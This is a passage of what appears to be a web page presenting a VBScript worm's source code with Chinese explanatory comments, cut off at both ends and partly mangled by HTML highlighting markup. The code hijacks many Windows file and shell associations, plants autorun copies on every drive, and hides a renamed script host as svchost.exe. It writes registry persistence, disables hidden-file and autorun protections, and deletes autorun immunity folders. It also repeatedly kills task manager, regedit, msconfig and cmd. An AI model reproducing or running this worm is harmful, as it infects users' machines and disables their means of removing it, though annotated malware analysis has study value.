class="attr">3</span>)) '//<span class="attr">LCase</span> 返回字符串的小写形式 <span class="attr">Right</span> 从字符串右边返回指定数目的字符</span></span><br><span class="line"><span class="tag">   </span></span><br><span class="line"><span class="tag">    <span class="attr">Select</span> <span class="attr">Case</span> <span class="attr">SubParam</span> '//<span class="attr">select</span>类似<span class="attr">switch</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">run</span>" '//当运行<span class="attr">run</span>时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">Left(WScript.ScriptFullName,</span> <span class="attr">2</span>) '//<span class="attr">ScriptFullName</span>属性返回当前正在运行的脚本的完整路径。该属性返回一个只读的字符串。</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">txt</span>", "<span class="attr">log</span>","<span class="attr">ini</span>" ,"<span class="attr">inf</span>" '//运行"<span class="attr">txt</span>", "<span class="attr">log</span>", "<span class="attr">ini</span>", "<span class="attr">inf</span>"后缀名文件时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"%SystemRoot%/system32/NOTEPAD.EXE "</span>&<span class="attr">Param</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">bat</span>", "<span class="attr">cmd</span>" '//运行"<span class="attr">bat</span>", "<span class="attr">cmd</span>"批处理或命令提示符时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"CMD /c echo Hi!I'm here!&pause"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">reg</span>" '//运行"<span class="attr">reg</span>"注册表导入程序时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"regedit.exe "</span>&""""&<span class="attr">Trim</span>(<span class="attr">Param</span>)&""""</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">chm</span>" '//运行"<span class="attr">chm</span>"帮助文件时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"hh.exe "</span>&""""&<span class="attr">Trim</span>(<span class="attr">Param</span>)&""""</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">hlp</span>" '//运行"<span class="attr">hlp</span>"帮助文件时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"winhlp32.exe "</span>&""""&<span class="attr">Trim</span>(<span class="attr">Param</span>)&""""</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">dir</span>" '//运行<span class="attr">dir</span>命令，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">""</span>""&<span class="attr">Left</span>(<span class="attr">Trim</span>(<span class="attr">Param</span>),<span class="attr">Len</span>(<span class="attr">Trim</span>(<span class="attr">Param</span>))<span class="attr">-3</span>)&""""</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">oie</span>" '//打开我<span class="attr">IE</span>图标，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">""</span>"%<span class="attr">ProgramFiles</span>%/<span class="attr">Internet</span> <span class="attr">Explorer</span>/<span class="attr">IEXPLORE.EXE</span>"""</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">omc</span>" '//打开我的电脑图标，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"explorer.exe /n,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">emc</span>" '//劫持<span class="attr">Win</span>+<span class="attr">E</span></span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"explorer.exe /n,/e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> <span class="attr">Else</span></span></span><br><span class="line"><span class="tag">        <span class="attr">If</span> <span class="attr">PreDblInstance</span>=<span class="string">True</span> <span class="attr">Then</span> '//如果条件满足，退出脚本宿主</span></span><br><span class="line"><span class="tag">            <span class="attr">WScript.Quit</span></span></span><br><span class="line"><span class="tag">        <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Timeout</span> = <span class="string">Datediff(</span>"<span class="attr">ww</span>", <span class="attr">GetInfectedDate</span>, <span class="attr">Date</span>) <span class="attr">-</span> <span class="attr">12</span></span></span><br><span class="line"><span class="tag">        <span class="attr">If</span> <span class="attr">Timeout</span>></span>0 And Month(Date) = Day(Date) Then</span><br><span class="line">               Call VirusAlert()</span><br><span class="line">               Call MakeJoke(CInt(Month(Date)))</span><br><span class="line">        End If</span><br><span class="line">        Call MonitorSystem()</span><br><span class="line">       </span><br><span class="line">    End Select</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//监视系统 结束taskmgr.exe、regedit.exe、msconfig.exe、cmd.exe</span><br><span class="line">Sub MonitorSystem()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim ProcessNames, ExeFullNames</span><br><span class="line">    ProcessNames=Array("cmd.exe","cmd.com","regedit.exe","regedit.scr","regedit.pif","regedit.com","msconfig.exe")</span><br><span class="line">    VBSFullNames=Array(GetMainVirus(1)) '//变量赋值</span><br><span class="line">    Do</span><br><span class="line">        Call KillProcess(ProcessNames) '//如发现变量中的进程，调用结束进程函数</span><br><span class="line">        Call InvadeSystem(GetMainVirus(1),GetMainVirus(0)) '// smss.exe 蠕虫地址 explorer.exe 蠕虫地址</span><br><span class="line">        Call KeepProcess(VBSFullNames) '//保持病毒进程</span><br><span class="line">        WScript.Sleep 3000 '//脚本宿主等待时间为3000毫秒=3秒</span><br><span class="line">    Loop</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//侵入系统</span><br><span class="line">Sub InvadeSystem(VirusLoadPath,VirusAssPath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Load_Value, File_Value, IE_Value, MyCpt_Value1, MyCpt_Value2, HCULoad, HCUVer, VirusCode, Version</span><br><span class="line">    Load_Value=""""&VirusLoadPath&"""" '//smss.exe的病毒流</span><br><span class="line">    File_Value="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" %1 %* " '// explorer.exe 蠕虫</span><br><span class="line">    IE_Value="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" OIE " '// 打开ie 蠕虫</span><br><span class="line">    MyCpt_Value1="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" OMC " '//打开我的电脑 蠕虫</span><br><span class="line">    MyCpt_Value2="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" EMC " '//劫持Win+E 蠕虫</span><br><span class="line">    HCULoad="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Load"</span><br><span class="line">    HCUVer="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"</span><br><span class="line">    HCUDate="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"</span><br><span class="line">    VirusCode=GetCode(WScript.ScriptFullName)</span><br><span class="line">    Version=1</span><br><span class="line">    HostSourcePath=Fso.GetSpecialFolder(1)&"/Wscript.exe"</span><br><span class="line">    HostFilePath=Fso.GetSpecialFolder(0)&"/system/svchost.exe"</span><br><span class="line">   </span><br><span class="line">    For Each Drive In Fso.Drives '//分别建立各个目录的病毒名字</span><br><span class="line">        If Drive.IsReady and (Drive.DriveType=1 Or Drive.DriveType=2 Or Drive.DriveType=3) Then</span><br><span class="line">            DiskVirusName=GetSerialNumber(Drive.DriveLetter)&".vbs"</span><br><span class="line">                Call CreateAutoRun(Drive.DriveLetter,DiskVirusName) '//创建自动运行</span><br><span class="line">                Call InfectRoot(Drive.DriveLetter,DiskVirusName) '//感染</span><br><span class="line">        End If</span><br><span class="line">    Next</span><br><span class="line">   </span><br><span class="line">    If FSO.FileExists(VirusAssPath)=False Or FSO.FileExists(VirusLoadPath)=False Or FSO.FileExists(HostFilePath)=False Or GetVersion()<span class="tag">< <span class="attr">Version</span> <span class="attr">Then</span></span></span><br><span class="line"><span class="tag">        <span class="attr">If</span> <span class="attr">GetFileSystemType</span>(<span class="attr">GetSystemDrive</span>())=<span class="string">"NTFS"</span> <span class="attr">Then</span> '//判断是否为<span class="attr">NTFS</span>分区</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CreateFile</span>(<span class="attr">VirusCode</span>,<span class="attr">VirusAssPath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CreateFile</span>(<span class="attr">VirusCode</span>,<span class="attr">VirusLoadPath</span>) '//这一步创建了流文件</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CopyFile</span>(<span class="attr">HostSourcePath</span>,<span class="attr">HostFilePath</span>) '//这一步将<span class="attr">wscript.exe</span>从<span class="attr">system32</span>复制到<span class="attr">system</span>目录并改名<span class="attr">svchost.exe</span></span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">HostFilePath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Else</span> '//<span class="attr">FAT32</span>格式</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CreateFile</span>(<span class="attr">VirusCode</span>, <span class="attr">VirusAssPath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">VirusAssPath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CreateFile</span>(<span class="attr">VirusCode</span>,<span class="attr">VirusLoadPath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">VirusLoadPath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CopyFile</span>(<span class="attr">HostSourcePath</span>, <span class="attr">HostFilePath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">HostFilePath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">    <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">   </span></span><br><span class="line">    If ReadReg(HCULoad)<>Load_Value  Then  '//改写注册表启动项，smss.exe的流</span><br><span class="line">        Call WriteReg (HCULoad, Load_Value, "")</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If GetVersion() <span class="tag">< <span class="attr">Version</span> <span class="attr">Then</span>   '//改写版本信息为<span class="attr">1</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">WriteReg</span> (<span class="attr">HCUVer</span>, <span class="attr">Version</span>, "")</span></span><br><span class="line"><span class="tag">    <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">   </span></span><br><span class="line"><span class="tag">    <span class="attr">If</span> <span class="attr">GetInfectedDate</span>() = <span class="string">""</span> <span class="attr">Then</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">WriteReg</span> (<span class="attr">HCUDate</span>, <span class="attr">Date</span>, "")  '//记录感染时间</span></span><br><span class="line"><span class="tag">    <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    '//以下更改许多文件关联,病毒的通用感染方式</span></span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/")<>File_Value Then</span><br><span class="line">        Call SetTxtFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetIniFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetInfFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetBatFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetCmdFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetRegFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetchmFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SethlpFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/")<span class="tag"><></span>IE_Value Then</span><br><span class="line">        Call SetIEAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_CLASSES_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/")<span class="tag"><></span>IE_Value Then</span><br><span class="line">        Call SetIEAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/")<span class="tag"><></span>MyCpt_Value1 Then</span><br><span class="line">        Call SetMyComputerAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/")<span class="tag"><></span>MyCpt_Value2 Then</span><br><span class="line">        Call SetMyComputerAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    Call RegSet()</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//拷贝文件</span><br><span class="line">Sub CopyFile(source, pathf)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    If FSO.FileExists(pathf) Then</span><br><span class="line">        FSO.DeleteFile pathf , True</span><br><span class="line">    End If   </span><br><span class="line">    FSO.CopyFile source, pathf</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//创建文件</span><br><span class="line">Sub CreateFile(code, pathf)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim FileText</span><br><span class="line">    If FSO.FileExists(pathf) Then</span><br><span class="line">        Set FileText=FSO.OpenTextFile(pathf, 2, False)</span><br><span class="line">        FileText.Write code</span><br><span class="line">        FileText.Close</span><br><span class="line">    Else</span><br><span class="line">        Set FileText=FSO.OpenTextFile(pathf, 2, True)</span><br><span class="line">        FileText.Write code</span><br><span class="line">        FileText.Close</span><br><span class="line">    End If</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//注册表设置</span><br><span class="line">Sub RegSet()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim RegPath1 , RegPath2, RegPath3, RegPath4</span><br><span class="line">    RegPath1="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/NOHIDDEN/CheckedValue"</span><br><span class="line">    RegPath2="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/SHOWALL/CheckedValue"</span><br><span class="line">    RegPath3="HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoDriveTypeAutoRun"</span><br><span class="line">    RegPath4="HKEY_CLASSES_ROOT/lnkfile/IsShortcut"</span><br><span class="line">    Call WriteReg (RegPath1, 3, "REG_DWORD")</span><br><span class="line">    Call WriteReg (RegPath2, 2, "REG_DWORD")</span><br><span class="line">    Call WriteReg (RegPath3, 0, "REG_DWORD")</span><br><span class="line">    Call DeleteReg (RegPath4)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//结束进程</span><br><span class="line">Sub KillProcess(ProcessNames)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Set WMIService=GetObject("winmgmts://./root/cimv2")</span><br><span class="line">    For Each ProcessName in ProcessNames</span><br><span class="line">        Set ProcessList=WMIService.execquery(" Select * From win32_process where name ='"&ProcessName&"' ")</span><br><span class="line">        For Each Process in ProcessList</span><br><span class="line">            IntReturn=Process.terminate</span><br><span class="line">            If intReturn<span class="tag"><></span>0 Then</span><br><span class="line">                WshShell.Run "CMD /c ntsd -c q -p "&Process.Handle, vbHide, False</span><br><span class="line">            End If</span><br><span class="line">        Next</span><br><span class="line">    Next</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//删掉autorun.inf免疫目录</span><br><span class="line">Sub KillImmunity(D)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    ImmunityFolder=D&":/Autorun.inf"</span><br><span class="line">    If Fso.FolderExists(ImmunityFolder) Then</span><br><span class="line">        WshSHell.Run ("CMD /C CACLS "& """"&ImmunityFolder&"""" &" /t /e /c /g everyone:f"),vbHide,True   '//提权</span><br><span class="line">        WshSHell.Run ("CMD /C RD /S /Q "& ImmunityFolder), vbHide, True   '//rd命令删除，配合 /s /q 选项，很轻松</span><br><span class="line">    End If</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//保护病毒进程 保持脚本进程持续运行，少于2个创建新进程</span><br><span class="line">Sub KeepProcess(VBSFullNames)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    For Each VBSFullName in VBSFullNames</span><br><span class="line">        If VBSProcessCount(VBSFullName) <span class="tag">< <span class="attr">2</span> <span class="attr">then</span></span></span><br><span class="line"><span class="tag">            <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VBSFullName</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Next</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Sub</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//获得系统分区 <span class="attr">c:</span></span></span><br><span class="line"><span class="tag">'//<span class="attr">FileSystemObject.GetSpecialFolder</span> 返回指定特殊文件夹</span></span><br><span class="line"><span class="tag">'//<span class="attr">WindowsFolder</span>   <span class="attr">0</span>   <span class="attr">Windows</span> 文件夹，包含 <span class="attr">Windows</span> 操作系统安装的文件。</span></span><br><span class="line"><span class="tag">'//<span class="attr">SystemFolder</span>    <span class="attr">1</span>   <span class="attr">System</span> 文件夹，包含库、字体和设备驱动程序文件。</span></span><br><span class="line"><span class="tag">'//<span class="attr">TemporaryFolder</span> <span class="attr">2</span>   <span class="attr">Temp</span> 文件夹，用于保存临时文件。可以在 <span class="attr">TMP</span> 环境变量中找到该文件夹的路径。</span></span><br><span class="line"><span class="tag">'//<span class="attr">Left</span> 返回指定数目的从字符串的左边算起的字符。</span></span><br><span class="line"><span class="tag"><span class="attr">Function</span> <span class="attr">GetSystemDrive</span>()</span></span><br><span class="line"><span class="tag">    <span class="attr">GetSystemDrive</span>=<span class="string">Left(Fso.GetSpecialFolder(0),2)</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Function</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//<span class="attr">FileSystemObject.GetDrive</span>返回与指定的路径中驱动器相对应的 <span class="attr">Drive</span> 对象。<span class="attr">Drive</span> 提供对磁盘驱动器或网络共享的属性的访问。</span></span><br><span class="line"><span class="tag">'//<span class="attr">Drive.FileSystem</span>返回指定的驱动器使用的文件系统的类型。</span></span><br><span class="line"><span class="tag"><span class="attr">Function</span> <span class="attr">GetFileSystemType</span>(<span class="attr">Drive</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">d</span>=<span class="string">FSO.GetDrive(Drive)</span></span></span><br><span class="line"><span class="tag">    <span class="attr">GetFileSystemType</span>=<span class="string">d.FileSystem</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Function</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//读取注册表建值 返回所在路径</span></span><br><span class="line"><span class="tag"><span class="attr">Function</span> <span class="attr">ReadReg</span>(<span class="attr">strkey</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">tmps</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">CreateObject(</span>"<span class="attr">WScript.Shell</span>")</span></span><br><span class="line"><span class="tag">    <span class="attr">ReadReg</span>=<span class="string">tmps.RegRead(strkey)</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">Nothing</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Function</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//重写注册表键值</span></span><br><span class="line"><span class="tag"><span class="attr">Sub</span> <span class="attr">WriteReg</span>(<span class="attr">strkey</span>, <span class="attr">Value</span>, <span class="attr">vtype</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">tmps</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">CreateObject(</span>"<span class="attr">WScript.Shell</span>")</span></span><br><span class="line"><span class="tag">    <span class="attr">If</span> <span class="attr">vtype</span>=<span class="string">""</span> <span class="attr">Then</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tmps.RegWrite</span> <span class="attr">strkey</span>, <span class="attr">Value</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Else</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tmps.RegWrite</span> <span class="attr">strkey</span>, <span class="attr">Value</span>, <span class="attr">vtype</span></span></span><br><span class="line"><span class="tag">    <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">Nothing</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Sub</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//删除注册表键值</span></span><br><span class="line"><span class="tag"><span class="attr">Sub</span> <span class="attr">DeleteReg</span>(<span class="attr">strkey</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">tmps</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">CreateObject(</span>"<span class="attr">WScript.Shell</span>")</span></span><br><span class="line"><span class="tag">    <span class="attr">tmps.RegDelete</span> <span class="attr">strkey</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">Nothing</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Sub</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//设置隐藏属性</span></span><br><span class="line"><span class="tag"><span 